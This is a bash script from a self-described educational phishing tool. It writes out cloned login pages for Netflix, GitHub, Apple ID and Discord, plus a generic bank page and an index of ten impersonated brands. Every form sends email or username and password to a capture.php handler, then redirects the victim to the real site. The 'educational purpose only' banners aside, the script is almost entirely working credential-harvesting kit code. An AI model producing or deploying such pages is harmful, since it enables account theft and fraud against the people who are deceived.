#!/bin/bash

# Additional Templates for Educational Phishing Tool
# Created by: ABID MEHMOOD (The White HAT Hacker)

# Netflix template
create_netflix_template() {
    echo -e "${YELLOW}[*] Creating Netflix login template...${NC}"
    create_capture_script
    
    cat > templates/netflix.html << 'EOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background: #000; color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { width: 450px; background: rgba(0,0,0,0.75); padding: 60px 68px 40px; border-radius: 4px; }
        .logo { text-align: center; margin-bottom: 28px; }
        .logo h1 { color: #e50914; font-size: 32px; font-weight: 700; }
        .title { font-size: 32px; font-weight: 700; margin-bottom: 28px; }
        .form-group { margin-bottom: 16px; }
        input { width: 100%; padding: 16px 20px; background: #333; border: none; border-radius: 4px; color: #fff; font-size: 16px; }
        input:focus { background: #454545; outline: none; }
        input::placeholder { color: #8c8c8c; }
        .login-btn { width: 100%; background: #e50914; color: #fff; padding: 16px; border: none; border-radius: 4px; font-size: 16px; font-weight: 700; cursor: pointer; margin: 24px 0 12px; }
        .login-btn:hover { background: #f40612; }
        .help-links { display: flex; justify-content: space-between; font-size: 13px; }
        .help-links a { color: #b3b3b3; text-decoration: none; }
        .help-links a:hover { text-decoration: underline; }
        .signup-text { margin-top: 16px; color: #737373; font-size: 16px; }
        .signup-text a { color: #fff; text-decoration: none; }
        .signup-text a:hover { text-decoration: underline; }
        .footer { text-align: center; margin-top: 32px; color: #737373; font-size: 12px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>NETFLIX</h1>
        </div>
        
        <h1 class="title">Sign In</h1>
        
        <form method="POST" action="capture.php">
            <input type="hidden" name="redirect_url" value="https://netflix.com">
            <div class="form-group">
                <input type="email" name="email" placeholder="Email or phone number" required>
            </div>
            <div class="form-group">
                <input type="password" name="password" placeholder="Password" required>
            </div>
            <button type="submit" class="login-btn">Sign In</button>
        </form>
        
        <div class="help-links">
            <label><input type="checkbox" style="margin-right: 8px;"> Remember me</label>
            <a href="#">Need help?</a>
        </div>
        
        <div class="signup-text">
            New to Netflix? <a href="#">Sign up now</a>.
        </div>
        
        <div class="footer">
            <strong>Educational Tool by ABID MEHMOOD (The White HAT Hacker)</strong>
        </div>
    </div>
</body>
</html>
EOF
    
    echo -e "${GREEN}[✓] Netflix template created: templates/netflix.html${NC}"
    echo -e "${CYAN}[*] Access at: http://localhost:8080/netflix.html${NC}"
    sleep 2
}

# GitHub template
create_github_template() {
    echo -e "${YELLOW}[*] Creating GitHub login template...${NC}"
    create_capture_script
    
    cat > templates/github.html << 'EOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to GitHub</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif; background: #0d1117; color: #f0f6fc; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { width: 340px; }
        .login-box { background: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 32px; }
        .logo { text-align: center; margin-bottom: 24px; }
        .logo svg { width: 48px; height: 48px; fill: #f0f6fc; }
        .title { font-size: 24px; font-weight: 300; text-align: center; margin-bottom: 16px; }
        .form-group { margin-bottom: 16px; }
        label { display: block; font-size: 14px; font-weight: 600; margin-bottom: 8px; }
        input { width: 100%; padding: 5px 12px; background: #0d1117; border: 1px solid #30363d; border-radius: 6px; color: #f0f6fc; font-size: 14px; line-height: 20px; }
        input:focus { border-color: #58a6ff; outline: none; box-shadow: 0 0 0 3px rgba(88, 166, 255, 0.3); }
        .login-btn { width: 100%; background: #238636; color: #fff; padding: 5px 16px; border: none; border-radius: 6px; font-size: 14px; font-weight: 500; cursor: pointer; margin: 16px 0; }
        .login-btn:hover { background: #2ea043; }
        .forgot-password { text-align: center; margin: 16px 0; }
        .forgot-password a { color: #58a6ff; text-decoration: none; font-size: 12px; }
        .forgot-password a:hover { text-decoration: underline; }
        .signup-box { background: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 16px; margin-top: 16px; text-align: center; }
        .signup-box p { font-size: 14px; }
        .signup-box a { color: #58a6ff; text-decoration: none; }
        .signup-box a:hover { text-decoration: underline; }
        .footer { text-align: center; margin-top: 24px; color: #7d8590; font-size: 12px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">
                <svg height="48" viewBox="0 0 16 16" width="48">
                    <path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/>
                </svg>
            </div>
            
            <h1 class="title">Sign in to GitHub</h1>
            
            <form method="POST" action="capture.php">
                <input type="hidden" name="redirect_url" value="https://github.com">
                <div class="form-group">
                    <label for="username">Username or email address</label>
                    <input type="text" id="username" name="username" required>
                </div>
                <div class="form-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" required>
                </div>
                <button type="submit" class="login-btn">Sign in</button>
            </form>
            
            <div class="forgot-password">
                <a href="#">Forgot password?</a>
            </div>
        </div>
        
        <div class="signup-box">
            <p>New to GitHub? <a href="#">Create an account</a>.</p>
        </div>
        
        <div class="footer">
            <strong>Educational Tool by ABID MEHMOOD (The White HAT Hacker)</strong>
        </div>
    </div>
</body>
</html>
EOF
    
    echo -e "${GREEN}[✓] GitHub template created: templates/github.html${NC}"
    echo -e "${CYAN}[*] Access at: http://localhost:8080/github.html${NC}"
    sleep 2
}

# Apple ID template
create_apple_template() {
    echo -e "${YELLOW}[*] Creating Apple ID login template...${NC}"
    create_capture_script
    
    cat > templates/apple.html << 'EOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In - Apple</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f5f5f7; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { width: 100%; max-width: 480px; padding: 0 20px; }
        .login-box { background: #fff; border-radius: 18px; padding: 48px 40px; box-shadow: 0 4px 16px rgba(0,0,0,0.1); }
        .logo { text-align: center; margin-bottom: 32px; }
        .logo svg { width: 32px; height: 32px; }
        .title { font-size: 32px; font-weight: 600; text-align: center; color: #1d1d1f; margin-bottom: 8px; }
        .subtitle { font-size: 19px; color: #86868b; text-align: center; margin-bottom: 32px; }
        .form-group { margin-bottom: 16px; }
        input { width: 100%; padding: 16px; border: 1px solid #d2d2d7; border-radius: 12px; font-size: 17px; background: #fff; }
        input:focus { border-color: #007aff; outline: none; }
        .login-btn { width: 100%; background: #007aff; color: #fff; padding: 16px; border: none; border-radius: 12px; font-size: 17px; font-weight: 400; cursor: pointer; margin: 24px 0 16px; }
        .login-btn:hover { background: #0056cc; }
        .forgot-password { text-align: center; margin: 16px 0; }
        .forgot-password a { color: #007aff; text-decoration: none; font-size: 17px; }
        .forgot-password a:hover { text-decoration: underline; }
        .create-account { text-align: center; margin-top: 24px; padding-top: 24px; border-top: 1px solid #d2d2d7; }
        .create-account p { color: #86868b; font-size: 17px; margin-bottom: 16px; }
        .create-btn { color: #007aff; text-decoration: none; font-size: 17px; }
        .create-btn:hover { text-decoration: underline; }
        .footer { text-align: center; margin-top: 32px; color: #86868b; font-size: 12px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">
                <svg viewBox="0 0 24 24" fill="#000">
                    <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/>
                </svg>
            </div>
            
            <h1 class="title">Sign In</h1>
            <p class="subtitle">Use your Apple ID to sign in</p>
            
            <form method="POST" action="capture.php">
                <input type="hidden" name="redirect_url" value="https://appleid.apple.com">
                <div class="form-group">
                    <input type="email" name="email" placeholder="Apple ID" required>
                </div>
                <div class="form-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit" class="login-btn">Sign In</button>
            </form>
            
            <div class="forgot-password">
                <a href="#">Forgot Apple ID or password?</a>
            </div>
            
            <div class="create-account">
                <p>Don't have an Apple ID?</p>
                <a href="#" class="create-btn">Create yours now</a>
            </div>
            
            <div class="footer">
                <strong>Educational Tool by ABID MEHMOOD (The White HAT Hacker)</strong>
            </div>
        </div>
    </div>
</body>
</html>
EOF
    
    echo -e "${GREEN}[✓] Apple ID template created: templates/apple.html${NC}"
    echo -e "${CYAN}[*] Access at: http://localhost:8080/apple.html${NC}"
    sleep 2
}

# Discord template
create_discord_template() {
    echo -e "${YELLOW}[*] Creating Discord login template...${NC}"
    create_capture_script
    
    cat > templates/discord.html << 'EOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord | Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'gg sans', 'Noto Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif; background: #5865f2; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { width: 480px; }
        .login-box { background: #36393f; border-radius: 8px; padding: 32px; box-shadow: 0 2px 10px 0 rgba(0,0,0,.2); }
        .title { color: #fff; font-size: 24px; font-weight: 600; text-align: center; margin-bottom: 8px; }
        .subtitle { color: #b9bbbe; font-size: 16px; text-align: center; margin-bottom: 20px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; color: #b9bbbe; font-size: 12px; font-weight: 600; text-transform: uppercase; margin-bottom: 8px; }
        input { width: 100%; padding: 10px; background: #202225; border: 1px solid #202225; border-radius: 3px; color: #dcddde; font-size: 16px; }
        input:focus { border-color: #00aff4; outline: none; }
        .login-btn { width: 100%; background: #5865f2; color: #fff; padding: 12px; border: none; border-radius: 3px; font-size: 16px; font-weight: 500; cursor: pointer; margin: 20px 0 8px; }
        .login-btn:hover { background: #4752c4; }
        .forgot-password { color: #00aff4; text-decoration: none; font-size: 14px; }
        .forgot-password:hover { text-decoration: underline; }
        .register-text { color: #72767d; font-size: 14px; margin-top: 4px; }
        .register-text a { color: #00aff4; text-decoration: none; }
        .register-text a:hover { text-decoration: underline; }
        .footer { text-align: center; margin-top: 32px; color: #72767d; font-size: 12px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <h1 class="title">Welcome back!</h1>
            <p class="subtitle">We're so excited to see you again!</p>
            
            <form method="POST" action="capture.php">
                <input type="hidden" name="redirect_url" value="https://discord.com">
                <div class="form-group">
                    <label for="email">Email or Phone Number *</label>
                    <input type="text" id="email" name="email" required>
                </div>
                <div class="form-group">
                    <label for="password">Password *</label>
                    <input type="password" id="password" name="password" required>
                </div>
                <a href="#" class="forgot-password">Forgot your password?</a>
                <button type="submit" class="login-btn">Log In</button>
            </form>
            
            <div class="register-text">
                Need an account? <a href="#">Register</a>
            </div>
            
            <div class="footer">
                <strong>Educational Tool by ABID MEHMOOD (The White HAT Hacker)</strong>
            </div>
        </div>
    </div>
</body>
</html>
EOF
    
    echo -e "${GREEN}[✓] Discord template created: templates/discord.html${NC}"
    echo -e "${CYAN}[*] Access at: http://localhost:8080/discord.html${NC}"
    sleep 2
}

# Banking template
create_banking_template() {
    echo -e "${YELLOW}[*] Creating Banking login template...${NC}"
    create_capture_script
    
    cat > templates/banking.html << 'EOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SecureBank - Online Banking</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { width: 400px; }
        .login-box { background: #fff; border-radius: 10px; padding: 40px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo h1 { color: #2c3e50; font-size: 28px; font-weight: 700; }
        .logo p { color: #7f8c8d; font-size: 14px; margin-top: 5px; }
        .title { font-size: 24px; color: #2c3e50; text-align: center; margin-bottom: 30px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; color: #34495e; font-size: 14px; font-weight: 600; margin-bottom: 8px; }
        input { width: 100%; padding: 12px 15px; border: 2px solid #ecf0f1; border-radius: 8px; font-size: 16px; transition: border-color 0.3s; }
        input:focus { border-color: #3498db; outline: none; }
        .login-btn { width: 100%; background: linear-gradient(135deg, #3498db, #2980b9); color: #fff; padding: 15px; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; margin: 20px 0; transition: transform 0.2s; }
        .login-btn:hover { transform: translateY(-2px); }
        .security-info { background: #f8f9fa; padding: 15px; border-radius: 8px; margin: 20px 0; }
        .security-info h4 { color: #27ae60; font-size: 14px; margin-bottom: 8px; }
        .security-info p { color: #7f8c8d; font-size: 12px; line-height: 1.4; }
        .links { display: flex; justify-content: space-between; margin-top: 20px; }
        .links a { color: #3498db; text-decoration: none; font-size: 14px; }
        .links a:hover { text-decoration: underline; }
        .footer { text-align: center; margin-top: 30px; color: #7f8c8d; font-size: 12px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">
                <h1>🏦 SecureBank</h1>
                <p>Your trusted banking partner</p>
            </div>
            
            <h2 class="title">Online Banking Login</h2>
            
            <form method="POST" action="capture.php">
                <input type="hidden" name="redirect_url" value="https://example-bank.com">
                <div class="form-group">
                    <label for="username">Username</label>
                    <input type="text" id="username" name="username" required>
                </div>
                <div class="form-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" required>
                </div>
                <button type="submit" class="login-btn">🔐 Secure Login</button>
            </form>
            
            <div class="security-info">
                <h4>🛡️ Security Notice</h4>
                <p>We use 256-bit SSL encryption to protect your information. Never share your login credentials with anyone.</p>
            </div>
            
            <div class="links">
                <a href="#">Forgot Password?</a>
                <a href="#">Register Account</a>
            </div>
            
            <div class="footer">
                <strong>Educational Tool by ABID MEHMOOD (The White HAT Hacker)</strong>
            </div>
        </div>
    </div>
</body>
</html>
EOF
    
    echo -e "${GREEN}[✓] Banking template created: templates/banking.html${NC}"
    echo -e "${CYAN}[*] Access at: http://localhost:8080/banking.html${NC}"
    sleep 2
}

# Create index page
create_index_page() {
    cat > templates/index.html << 'EOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Educational Phishing Tool - ABID MEHMOOD</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; }
        .header { background: rgba(0,0,0,0.1); padding: 20px 0; text-align: center; color: white; }
        .header h1 { font-size: 48px; margin-bottom: 10px; text-shadow: 2px 2px 4px rgba(0,0,0,0.3); }
        .header p { font-size: 18px; opacity: 0.9; }
        .container { max-width: 1200px; margin: 40px auto; padding: 0 20px; }
        .templates-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; }
        .template-card { background: white; border-radius: 15px; padding: 25px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); transition: transform 0.3s, box-shadow 0.3s; }
        .template-card:hover { transform: translateY(-5px); box-shadow: 0 15px 40px rgba(0,0,0,0.3); }
        .template-card h3 { color: #2c3e50; margin-bottom: 15px; font-size: 20px; }
        .template-card p { color: #7f8c8d; margin-bottom: 20px; line-height: 1.6; }
        .template-btn { display: inline-block; background: linear-gradient(135deg, #3498db, #2980b9); color: white; padding: 12px 25px; text-decoration: none; border-radius: 8px; font-weight: 600; transition: transform 0.2s; }
        .template-btn:hover { transform: scale(1.05); }
        .warning { background: #e74c3c; color: white; padding: 20px; border-radius: 10px; margin: 30px 0; text-align: center; }
        .warning h3 { margin-bottom: 10px; }
        .footer { text-align: center; color: white; padding: 40px 0; }
        .footer h2 { margin-bottom: 10px; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🎯 Educational Phishing Tool</h1>
        <p>Created by ABID MEHMOOD (The White HAT Hacker)</p>
    </div>
    
    <div class="container">
        <div class="warning">
            <h3>⚠️ EDUCATIONAL PURPOSE ONLY</h3>
            <p>This tool is designed for cybersecurity education and awareness. Use responsibly and only in authorized environments.</p>
        </div>
        
        <div class="templates-grid">
            <div class="template-card">
                <h3>📘 Facebook</h3>
                <p>Realistic Facebook login page template for social engineering awareness training.</p>
                <a href="facebook.html" class="template-btn">View Template</a>
            </div>
            
            <div class="template-card">
                <h3>📷 Instagram</h3>
                <p>Instagram login page replica to demonstrate social media phishing techniques.</p>
                <a href="instagram.html" class="template-btn">View Template</a>
            </div>
            
            <div class="template-card">
                <h3>📧 Gmail</h3>
                <p>Google Gmail sign-in page for email phishing awareness demonstrations.</p>
                <a href="gmail.html" class="template-btn">View Template</a>
            </div>
            
            <div class="template-card">
                <h3>🐦 Twitter/X</h3>
                <p>Twitter/X login interface for social platform security education.</p>
                <a href="twitter.html" class="template-btn">View Template</a>
            </div>
            
            <div class="template-card">
                <h3>💳 PayPal</h3>
                <p>PayPal login page to educate about financial phishing attacks.</p>
                <a href="paypal.html" class="template-btn">View Template</a>
            </div>
            
            <div class="template-card">
                <h3>🎬 Netflix</h3>
                <p>Netflix sign-in page for streaming service phishing awareness.</p>
                <a href="netflix.html" class="template-btn">View Template</a>
            </div>
            
            <div class="template-card">
                <h3>💻 GitHub</h3>
                <p>GitHub login page for developer-focused security training.</p>
                <a href="github.html" class="template-btn">View Template</a>
            </div>
            
            <div class="template-card">
                <h3>🍎 Apple ID</h3>
                <p>Apple ID sign-in page for iOS ecosystem security education.</p>
                <a href="apple.html" class="template-btn">View Template</a>
            </div>
            
            <div class="template-card">
                <h3>🎮 Discord</h3>
                <p>Discord login interface for gaming community security awareness.</p>
                <a href="discord.html" class="template-btn">View Template</a>
            </div>
            
            <div class="template-card">
                <h3>🏦 Banking</h3>
                <p>Generic banking login page for financial security training.</p>
                <a href="banking.html" class="template-btn">View Template</a>
            </div>
        </div>
    </div>
    
    <div class="footer">
        <h2>🛡️ Stay Safe Online</h2>
        <p>Always verify URLs, use 2FA, and never enter credentials on suspicious sites.</p>
        <p><strong>Created by ABID MEHMOOD (The White HAT Hacker)</strong></p>
    </div>
</body>
</html>
EOF
}